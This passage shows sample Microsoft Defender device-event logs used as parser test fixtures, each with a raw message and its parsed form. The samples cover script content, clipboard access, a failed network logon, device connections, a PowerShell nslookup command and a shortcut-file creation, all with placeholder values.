manifest file\\\\n                    return {}\\\\n\\\\n                manifest_info = zf.getinfo(manifest_path)\\\\n                if manifest_info.file_size > MAX_FILE_SIZE:\\\\n                    raise IOError(\\\\\\\"manifest file is too big\\\\\\\")\\\\n\\\\n                with zf.open(manifest_path) as f:\\\\n                    readline_f = functools.partial(f.readline, MAX_FILE_SIZE)\\\\n                    manifest_lines = list(x.decode().strip() for x in iter(readline_f, b''))\\\\n                    manifest = self._parse_manifest(manifest_lines)\\\\n                    return dict((k, v) for k, v in manifest\\\\n                            if not args.manifest_keys or any(m.search(k.lower()) for m in args.manifest_keys))\\\\n        except:\\\\n            sys.stderr.write(\\\\\\\"error while reading manifest of '{}': {}\\\\\\\\n\\\\\\\".format(self.path, traceback.format_exc()))\\\\n\\\\n            if throw_on_error:\\\\n                raise\\\\n\\\\n            return {}\\\\n\\\\n    def manifest(self, throw_on_error=False):\\\\n        if not self._manifest:\\\\n            self._manifest = self._read_manifest(throw_on_error)\\\\n        return self._\\\"}\",\"InitiatingProcessAccountSid\":null,\"AppGuardContainerId\":null,\"InitiatingProcessSHA256\":null,\"SHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"RemoteUrl\":null,\"ProcessCreationTime\":null,\"ProcessTokenElevation\":null,\"ActionType\":\"ScriptContent\",\"FileOriginUrl\":null,\"FileOriginIP\":null,\"InitiatingProcessLogonId\":0,\"AccountSid\":null,\"RemoteDeviceName\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"LogonId\":null,\"LocalIP\":null,\"LocalPort\":null,\"RemoteIP\":null,\"RemotePort\":null,\"ProcessId\":null,\"ProcessCommandLine\":null,\"InitiatingProcessAccountUpn\":null,\"InitiatingProcessAccountObjectId\":null,\"FileSize\":null,\"InitiatingProcessFileSize\":null,\"InitiatingProcessVersionInfoCompanyName\":null,\"InitiatingProcessVersionInfoProductName\":null,\"InitiatingProcessVersionInfoProductVersion\":null,\"InitiatingProcessVersionInfoInternalFileName\":null,\"InitiatingProcessVersionInfoOriginalFileName\":null,\"InitiatingProcessVersionInfoFileDescription\":null,\"InitiatingProcessSessionId\":null,\"IsInitiatingProcessRemoteSession\":false,\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"CreatedProcessSessionId\":null,\"IsProcessRemoteSession\":false,\"ProcessRemoteSessionDeviceName\":null,\"ProcessRemoteSessionIP\":null,\"Timestamp\":\"2024-10-22T15:09:08.851712Z\",\"MachineGroup\":\"Linux Servers - remediate threats automatically\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "host"
            ],
            "dataset": "device_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-10-22T15:09:08.851712Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessLogonId": "0",
                "IsInitiatingProcessRemoteSession": "false"
            },
            "type": "ScriptContent"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "file": {
            "hash": {
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            }
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "65306"
                }
            }
        },
        "process": {
            "parent": {
                "pid": 0
            },
            "pid": 417271,
            "start": "2024-10-22T15:09:08.624070Z"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            ]
        }
    }
    	
	```


=== "test_device_events_get_clipboard_data.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-11-12T09:49:58.3460812Z\",\"tenantId\":\"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceEvents\",\"_TimeReceivedBySvc\":\"2024-11-12T09:49:02.3098089Z\",\"properties\":{\"DeviceId\":\"abcdef0123456789\",\"DeviceName\":\"example.com\",\"ReportId\":157950,\"InitiatingProcessId\":12824,\"InitiatingProcessCreationTime\":\"2024-11-12T10:09:31.1004556Z\",\"InitiatingProcessCommandLine\":\"\\\"OUTLOOK.EXE\\\" \",\"InitiatingProcessParentFileName\":\"exec.exe\",\"InitiatingProcessParentId\":18840,\"InitiatingProcessParentCreationTime\":\"2024-11-12T08:44:15.1503958Z\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessFileName\":\"outlook.exe\",\"InitiatingProcessFolderPath\":\"c:\\\\program files\\\\microsoft office\\\\root\\\\outlook.exe\",\"InitiatingProcessAccountName\":\"john.doe\",\"InitiatingProcessAccountDomain\":\"example.com\",\"SHA1\":null,\"MD5\":null,\"FileName\":null,\"FolderPath\":null,\"AccountName\":null,\"AccountDomain\":null,\"AdditionalFields\":null,\"InitiatingProcessAccountSid\":\"S-1-2-3\",\"AppGuardContainerId\":\"\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"SHA256\":null,\"RemoteUrl\":null,\"ProcessCreationTime\":null,\"ProcessTokenElevation\":null,\"ActionType\":\"GetClipboardData\",\"FileOriginUrl\":null,\"FileOriginIP\":null,\"InitiatingProcessLogonId\":389220681,\"AccountSid\":null,\"RemoteDeviceName\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"LogonId\":null,\"LocalIP\":null,\"LocalPort\":null,\"RemoteIP\":null,\"RemotePort\":null,\"ProcessId\":null,\"ProcessCommandLine\":null,\"InitiatingProcessAccountUpn\":\"john.doe@account-domain.fr\",\"InitiatingProcessAccountObjectId\":\"11111111-1111-1111-1111-111111111111\",\"FileSize\":null,\"InitiatingProcessFileSize\":44152968,\"InitiatingProcessVersionInfoCompanyName\":\"Microsoft Corporation\",\"InitiatingProcessVersionInfoProductName\":\"Microsoft Outlook\",\"InitiatingProcessVersionInfoProductVersion\":\"16.0.17928.20216\",\"InitiatingProcessVersionInfoInternalFileName\":\"Outlook\",\"InitiatingProcessVersionInfoOriginalFileName\":\"Outlook.exe\",\"InitiatingProcessVersionInfoFileDescription\":\"Microsoft Outlook\",\"InitiatingProcessSessionId\":\"22222222-2222-2222-2222-222222222222\",\"IsInitiatingProcessRemoteSession\":false,\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"CreatedProcessSessionId\":null,\"IsProcessRemoteSession\":false,\"ProcessRemoteSessionDeviceName\":null,\"ProcessRemoteSessionIP\":null,\"Timestamp\":\"2024-11-12T10:19:26.5027772Z\",\"MachineGroup\":\"All_Win10_11\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "host"
            ],
            "dataset": "device_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-11-12T10:19:26.502777Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessAccountObjectId": "11111111-1111-1111-1111-111111111111",
                "InitiatingProcessCommandLine": "\"OUTLOOK.EXE\" ",
                "InitiatingProcessFileSize": 44152968,
                "InitiatingProcessLogonId": "389220681",
                "InitiatingProcessSessionId": "22222222-2222-2222-2222-222222222222",
                "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
                "InitiatingProcessVersionInfoFileDescription": "Microsoft Outlook",
                "InitiatingProcessVersionInfoInternalFileName": "Outlook",
                "InitiatingProcessVersionInfoOriginalFileName": "Outlook.exe",
                "InitiatingProcessVersionInfoProductName": "Microsoft Outlook",
                "InitiatingProcessVersionInfoProductVersion": "16.0.17928.20216",
                "IsInitiatingProcessRemoteSession": "false"
            },
            "type": "GetClipboardData"
        },
        "agent": {
            "id": "abcdef0123456789"
        },
        "host": {
            "id": "abcdef0123456789",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "157950"
                }
            }
        },
        "process": {
            "command_line": "\"OUTLOOK.EXE\" ",
            "executable": "c:\\program files\\microsoft office\\root\\outlook.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "outlook.exe",
            "parent": {
                "name": "exec.exe",
                "pid": 18840,
                "start": "2024-11-12T08:44:15.150395Z"
            },
            "pid": 12824,
            "start": "2024-11-12T10:09:31.100455Z",
            "user": {
                "domain": "example.com",
                "email": "john.doe@account-domain.fr",
                "id": "S-1-2-3",
                "name": "john.doe"
            },
            "working_directory": "c:\\program files\\microsoft office\\root"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ]
        }
    }
    	
	```


=== "test_device_events_logon.json"

    ```json
	
    {
        "message": "{\"time\":\"2025-08-28T13:45:40.0045125Z\",\"tenantId\":\"tenant-test\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceLogonEvents\",\"_TimeReceivedBySvc\":\"2025-08-28T13:43:56.5953305Z\",\"properties\":{\"AccountName\":\"$\",\"AccountDomain\":\"$\",\"LogonType\":\"Network\",\"DeviceName\":\"example.com\",\"DeviceId\":\"device-test\",\"ReportId\":270478,\"AccountSid\":null,\"AppGuardContainerId\":\"\",\"LogonId\":null,\"RemoteIP\":\"1.1.1.1\",\"RemotePort\":63914,\"RemoteDeviceName\":\"kali\",\"ActionType\":\"LogonFailed\",\"InitiatingProcessId\":\"0\",\"InitiatingProcessCreationTime\":null,\"InitiatingProcessFileName\":null,\"InitiatingProcessFolderPath\":null,\"InitiatingProcessSHA1\":null,\"InitiatingProcessSHA256\":null,\"InitiatingProcessMD5\":null,\"InitiatingProcessCommandLine\":null,\"InitiatingProcessAccountName\":null,\"InitiatingProcessAccountDomain\":null,\"InitiatingProcessAccountSid\":null,\"InitiatingProcessTokenElevation\":\"None\",\"InitiatingProcessIntegrityLevel\":null,\"InitiatingProcessParentId\":\"0\",\"InitiatingProcessParentCreationTime\":null,\"InitiatingProcessParentFileName\":null,\"AdditionalFields\":\"{\\\"IsLocalLogon\\\":false}\",\"RemoteIPType\":\"Private\",\"IsLocalAdmin\":null,\"InitiatingProcessAccountUpn\":null,\"InitiatingProcessAccountObjectId\":null,\"Protocol\":\"NTLM\",\"FailureReason\":\"InvalidUserNameOrPassword\",\"InitiatingProcessFileSize\":null,\"InitiatingProcessVersionInfoCompanyName\":null,\"InitiatingProcessVersionInfoProductName\":null,\"InitiatingProcessVersionInfoProductVersion\":null,\"InitiatingProcessVersionInfoInternalFileName\":null,\"InitiatingProcessVersionInfoOriginalFileName\":null,\"InitiatingProcessVersionInfoFileDescription\":null,\"InitiatingProcessSessionId\":\"11111111-1111-1111-1111-111111111111\",\"IsInitiatingProcessRemoteSession\":\"11111111-1111-1111-1111-111111111111\",\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"InitiatingProcessUniqueId\":\"11111111-1111-1111-1111-111111111111\",\"Timestamp\":\"2025-08-28T13:42:11.0632078Z\",\"MachineGroup\":null},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "authentication"
            ],
            "dataset": "device_logon_events",
            "outcome": "InvalidUserNameOrPassword",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2025-08-28T13:42:11.063207Z",
        "action": {
            "name": "Publish",
            "outcome": "InvalidUserNameOrPassword",
            "properties": {
                "InitiatingProcessSessionId": "11111111-1111-1111-1111-111111111111",
                "IsInitiatingProcessRemoteSession": "11111111-1111-1111-1111-111111111111",
                "LogonType": "Network",
                "RemoteDeviceName": "kali",
                "RemoteIPType": "Private"
            },
            "type": "LogonFailed"
        },
        "agent": {
            "id": "device-test"
        },
        "destination": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1",
            "port": 63914
        },
        "host": {
            "id": "device-test",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "270478"
                }
            }
        },
        "network": {
            "protocol": "NTLM"
        },
        "process": {
            "parent": {
                "pid": 0
            },
            "pid": 0
        },
        "related": {
            "ip": [
                "1.1.1.1"
            ]
        }
    }
    	
	```


=== "test_device_events_pnp_device_connected.json"

    ```json
	
    {
        "message": "{\"time\":\"2025-09-10T14:02:34.3989457Z\",\"tenantId\":\"44444444-4444-4444-4444-444444444444\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceEvents\",\"_TimeReceivedBySvc\":\"2025-09-10T14:02:05.1005611Z\",\"properties\":{\"DeviceId\":\"33333333-3333-3333-3333-333333333333\",\"DeviceName\":\"hostname.example.org\",\"ReportId\":24314,\"InitiatingProcessId\":null,\"InitiatingProcessCreationTime\":null,\"InitiatingProcessCommandLine\":null,\"InitiatingProcessParentFileName\":null,\"InitiatingProcessParentId\":null,\"InitiatingProcessParentCreationTime\":null,\"InitiatingProcessSHA1\":null,\"InitiatingProcessMD5\":null,\"InitiatingProcessFileName\":null,\"InitiatingProcessFolderPath\":null,\"InitiatingProcessAccountName\":\"user1\",\"InitiatingProcessAccountDomain\":\"example.com\",\"SHA1\":null,\"MD5\":null,\"FileName\":null,\"FolderPath\":null,\"AccountName\":null,\"AccountDomain\":null,\"AdditionalFields\":\"{\\\"ClassName\\\":\\\"AudioEndpoint\\\",\\\"ClassId\\\":\\\"22222222-2222-2222-2222-222222222222\\\",\\\"DeviceId\\\":\\\"SWD\\\\\\\\MMDEVAPI\\\\\\\\{1.1.1.100000}.{11111111-1111-1111-1111-111111111111}\\\",\\\"DeviceDescription\\\":\\\"Microphone (2- Logi USB Headset)\\\",\\\"VendorIds\\\":[\\\"MMDEVAPI\\\\\\\\AudioEndpoints\\\"]}\",\"InitiatingProcessAccountSid\":\"S-1-5-18\",\"AppGuardContainerId\":\"\",\"InitiatingProcessSHA256\":null,\"SHA256\":null,\"RemoteUrl\":null,\"ProcessCreationTime\":null,\"ProcessTokenElevation\":null,\"ActionType\":\"PnpDeviceConnected\",\"FileOriginUrl\":null,\"FileOriginIP\":null,\"InitiatingProcessLogonId\":999,\"AccountSid\":null,\"RemoteDeviceName\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"LogonId\":null,\"LocalIP\":null,\"LocalPort\":null,\"RemoteIP\":null,\"RemotePort\":null}}",
        "event": {
            "category": [
                "host"
            ],
            "dataset": "device_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2025-09-10T14:02:34.398945Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessLogonId": "999"
            },
            "type": "PnpDeviceConnected"
        },
        "agent": {
            "id": "33333333-3333-3333-3333-333333333333"
        },
        "device": {
            "id": "SWD\\MMDEVAPI\\{1.1.1.100000}.{11111111-1111-1111-1111-111111111111}",
            "manufacturer": "MMDEVAPI\\AudioEndpoints",
            "model": {
                "name": "Microphone (2- Logi USB Headset)"
            }
        },
        "host": {
            "id": "33333333-3333-3333-3333-333333333333",
            "name": "hostname.example.org"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "24314"
                }
            }
        },
        "process": {
            "user": {
                "domain": "example.com",
                "id": "S-1-5-18",
                "name": "user1"
            }
        }
    }
    	
	```


=== "test_device_events_powershell_command.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-11-12T10:18:46.3194193Z\",\"tenantId\":\"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceEvents\",\"_TimeReceivedBySvc\":\"2024-11-12T10:17:19.1406475Z\",\"properties\":{\"DeviceId\":\"abcdef0123456789\",\"DeviceName\":\"example.com\",\"ReportId\":134294,\"InitiatingProcessId\":27568,\"InitiatingProcessCreationTime\":\"2024-11-12T10:15:16.4871111Z\",\"InitiatingProcessCommandLine\":\"powershell.exe\",\"InitiatingProcessParentFileName\":\"WindowsTerminal.exe\",\"InitiatingProcessParentId\":884,\"InitiatingProcessParentCreationTime\":\"2024-11-12T09:20:42.8246765Z\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessFileName\":\"powershell.exe\",\"InitiatingProcessFolderPath\":\"c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell.exe\",\"InitiatingProcessAccountName\":\"jdoe\",\"InitiatingProcessAccountDomain\":\"example.com\",\"SHA1\":null,\"MD5\":null,\"FileName\":null,\"FolderPath\":null,\"AccountName\":null,\"AccountDomain\":null,\"AdditionalFields\":\"{\\\"Command\\\":\\\"nslookup.exe user01-domain.USER01.local 1.1.1.1\\\"}\",\"InitiatingProcessAccountSid\":\"S-1-2-3\",\"AppGuardContainerId\":\"\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"SHA256\":null,\"RemoteUrl\":null,\"ProcessCreationTime\":null,\"ProcessTokenElevation\":null,\"ActionType\":\"PowerShellCommand\",\"FileOriginUrl\":null,\"FileOriginIP\":null,\"InitiatingProcessLogonId\":398124703,\"AccountSid\":null,\"RemoteDeviceName\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"LogonId\":null,\"LocalIP\":null,\"LocalPort\":null,\"RemoteIP\":null,\"RemotePort\":null,\"ProcessId\":null,\"ProcessCommandLine\":null,\"InitiatingProcessAccountUpn\":\"JDOE@domain.fr\",\"InitiatingProcessAccountObjectId\":\"22222222-2222-2222-2222-222222222222\",\"FileSize\":null,\"InitiatingProcessFileSize\":450560,\"InitiatingProcessVersionInfoCompanyName\":\"Microsoft Corporation\",\"InitiatingProcessVersionInfoProductName\":\"Microsoft\\u00ae Windows\\u00ae Operating System\",\"InitiatingProcessVersionInfoProductVersion\":\"10.0.22621.3085\",\"InitiatingProcessVersionInfoInternalFileName\":\"POWERSHELL\",\"InitiatingProcessVersionInfoOriginalFileName\":\"PowerShell.EXE\",\"InitiatingProcessVersionInfoFileDescription\":\"Windows PowerShell\",\"InitiatingProcessSessionId\":\"11111111-1111-1111-1111-111111111111\",\"IsInitiatingProcessRemoteSession\":false,\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"CreatedProcessSessionId\":null,\"IsProcessRemoteSession\":false,\"ProcessRemoteSessionDeviceName\":null,\"ProcessRemoteSessionIP\":null,\"Timestamp\":\"2024-11-12T10:15:59.5508823Z\",\"MachineGroup\":\"UnassignedGroup\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "host"
            ],
            "dataset": "device_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-11-12T10:15:59.550882Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessAccountObjectId": "22222222-2222-2222-2222-222222222222",
                "InitiatingProcessCommandLine": "powershell.exe",
                "InitiatingProcessFileSize": 450560,
                "InitiatingProcessLogonId": "398124703",
                "InitiatingProcessSessionId": "11111111-1111-1111-1111-111111111111",
                "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
                "InitiatingProcessVersionInfoFileDescription": "Windows PowerShell",
                "InitiatingProcessVersionInfoInternalFileName": "POWERSHELL",
                "InitiatingProcessVersionInfoOriginalFileName": "PowerShell.EXE",
                "InitiatingProcessVersionInfoProductName": "Microsoft\u00ae Windows\u00ae Operating System",
                "InitiatingProcessVersionInfoProductVersion": "10.0.22621.3085",
                "IsInitiatingProcessRemoteSession": "false"
            },
            "type": "PowerShellCommand"
        },
        "agent": {
            "id": "abcdef0123456789"
        },
        "host": {
            "id": "abcdef0123456789",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "134294"
                }
            }
        },
        "process": {
            "command_line": "powershell.exe",
            "executable": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "powershell.exe",
            "parent": {
                "name": "WindowsTerminal.exe",
                "pid": 884,
                "start": "2024-11-12T09:20:42.824676Z"
            },
            "pid": 27568,
            "start": "2024-11-12T10:15:16.487111Z",
            "user": {
                "domain": "example.com",
                "email": "JDOE@domain.fr",
                "id": "S-1-2-3",
                "name": "jdoe"
            },
            "working_directory": "c:\\windows\\system32\\windowspowershell\\v1.0"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ]
        }
    }
    	
	```


=== "test_device_events_shell_link_create_file.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-11-12T10:18:30.9849876Z\",\"tenantId\":\"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceEvents\",\"_TimeReceivedBySvc\":\"2024-11-12T10:18:00.0874785Z\",\"properties\":{\"DeviceId\":\"abcdef0123456789\",\"DeviceName\":\"example.com\",\"ReportId\":22722,\"InitiatingProcessId\":20948,\"InitiatingProcessCreationTime\":\"2024-11-12T10:02:28.7779103Z\",\"InitiatingProcessCommandLine\":\"\\\"WINWORD.EXE\\\" /n \\\"I:\\\\COMPANY\\\\Service\\\\FILE.doc\\\" /o \\\"\\\"\",\"InitiatingProcessParentFileName\":\"explorer.exe\",\"InitiatingProcessParentId\":14616,\"InitiatingProcessParentCreationTime\":\"2024-11-12T08:47:41.9520775Z\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessFileName\":\"winword.exe\",\"InitiatingProcessFolderPath\":\"c:\\\\program files (x86)\\\\microsoft office\\\\root\\\\office16\\\\winword.exe\",\"InitiatingProcessAccountName\":\"jdoe\",\"InitiatingProcessAccountDomain\":\"company\",\"SHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"MD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"FileName\":\"FILENAME.LNK\",\"FolderPath\":\"C:\\\\Users\\\\jdoe\\\\AppData\\\\Roaming\\\\Microsoft\\\\Office\\\\Recent\",\"AccountName\":null,\"AccountDomain\":null,\"AdditionalFields\":\"{\\\"FileSizeInBytes\\\":914,\\\"VolumeGuidPath\\\":\\\"\\\\\\\\\\\\\\\\?\\\\\\\\Volume{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}\\\",\\\"IsOnRemovableMedia\\\":false,\\\"ShellLinkRunAsAdmin\\\":false,\\\"ShellLinkShowCommand\\\":\\\"SW_SHOWNORMAL\\\"}\",\"InitiatingProcessAccountSid\":\"S-1-2-3\",\"AppGuardContainerId\":\"\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"SHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"RemoteUrl\":null,\"ProcessCreationTime\":\"2024-11-06T16:05:23.1138023Z\",\"ProcessTokenElevation\":null,\"ActionType\":\"ShellLinkCreateFileEvent\",\"FileOriginUrl\":null,\"FileOriginIP\":null,\"InitiatingProcessLogonId\":8066492,\"AccountSid\":null,\"RemoteDeviceName\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"LogonId\":null,\"LocalIP\":null,\"LocalPort\":null,\"RemoteIP\":null,\"RemotePort\":null,\"ProcessId\":null,\"ProcessCommandLine\":null,\"InitiatingProcessAccountUpn\":\"JOHNDOE@COMPANY.COM\",\"InitiatingProcessAccountObjectId\":\"22222222-2222-2222-2222-222222222222\",\"FileSize\":null,\"InitiatingProcessFileSize\":1621656,\"InitiatingProcessVersionInfoCompanyName\":\"Microsoft Corporation\",\"InitiatingProcessVersionInfoProductName\":\"Microsoft Office\",\"InitiatingProcessVersionInfoProductVersion\":\"16.0.17928.20216\",\"InitiatingProcessVersionInfoInternalFileName\":\"WinWord\",\"InitiatingProcessVersionInfoOriginalFileName\":\"WinWord.exe\",\"InitiatingProcessVersionInfoFileDescription\":\"Microsoft Word\",\"InitiatingProcessSessionId\":\"11111111-1111-1111-1111-111111111111\",\"IsInitiatingProcessRemoteSession\":false,\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"CreatedProcessSessionId\":null,\"IsProcessRemoteSession\":false,\"ProcessRemoteSessionDeviceName\":null,\"ProcessRemoteSessionIP\":null,\"Timestamp\":\"2024-11-12T10:17:23.3307226Z\",\"MachineGroup\":\"UnassignedGroup\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "host"
            ],
            "dataset": "device_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-11-12T10:17:23.330722Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessAccountObjectId": "22222222-2222-2222-2222-222222222222",
                "InitiatingProcessCommandLine": "\"WINWORD.EXE\" /n \"I:\\COMPANY\\Service\\FILE.doc\" /o \"\"",
                "InitiatingProcessFileSize": 1621656,
                "InitiatingProcessLogonId": "8066492",
                "InitiatingProcessSessionId": "11111111-1111-1111-1111-111111111111",
                "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
                "InitiatingProcessVersionInfoFileDescription": "Microsoft Word",
                "InitiatingProcessVersionInfoInternalFileName": "WinWord",
                "InitiatingProcessVersionInfoOriginalFileName": "WinWord.exe",
                "InitiatingProcessVersionInfoProductName": "Microsoft Office",
                "InitiatingProcessVersionInfoProductVersion": "16.0.17928.20216",
                "IsInitiatingProcessRemoteSession": "false"
            },
            "type": "ShellLinkCreateFileEvent"
        },
        "agent": {
            "id": "abcdef0123456789"
        },
        "file": {
            "directory": "C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\Office\\Recent",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "FILENAME.LNK"
        },
        "host": {
            "id": "abcdef0123456789",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "22722"
                }
            }
        },
        "process": {
            "args": [
                "\"\"",
                "\"I:\\COMPANY\\Service\\FILE.doc\"",
                "/n",
                "/o"
            ],
            "command_line": "\"WINWORD.EXE\" /n \"I:\\COMPANY\\Service\\FILE.doc\" /o \"\"",
            "executable": "c:\\program files (x86)\\microsoft office\\root\\office16\\winword.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "winword.exe",
            "parent": {
                "name": "explorer.exe",
                "pid": 14616,
                "start": "2024-11-12T08:47:41.952077Z"
            },
            "pid": 20948,
            "start": "2024-11-12T10:02:28.777910Z",
            "user": {
                "domain": "company",
                "email": "JOHNDOE@COMPANY.COM",
                "id": "S-1-2-3",
                "name": "jdoe"
            },
            "working_directory": "c:\\program files (x86)\\microsoft office\\root\\office16"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ]
        }
    }
    	
	```


=== "test_device_events_usb_drive_mounted.json"

    ```json
	
    {
        "message": "{\"time\":\"2025-09-10T14:01:25.5985372Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceEvents\",\"_TimeReceivedBySvc\":\"2025-09-10T14:00:33.8866248Z\",\"properties\":{\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"DeviceName\":\"host.example.com\",\"ReportId\":582046,\"InitiatingProcessId\":null,\"InitiatingProcessCreationTime\":null,\"InitiatingProcessCommandLine\":null,\"InitiatingProcessParentFileName\":null,\"InitiatingProcessParentId\":null,\"InitiatingProcessParentCreationTime\":null,\"InitiatingProcessSHA1\":null,\"InitiatingProcessMD5\":null,\"InitiatingProcessFileName\":null,\"InitiatingProcessFolderPath\":null,\"InitiatingProcessAccountName\":\"user1\",\"InitiatingProcessAccountDomain\":\"example.com\",\"SHA1\":null,\"MD5\":null,\"FileName\":null,\"FolderPath\":null,\"AccountName\":null,\"AccountDomain\":null,\"AdditionalFields\":\"{\\\"BusType\\\":3,\\\"ProductName\\\":\\\"Virtual 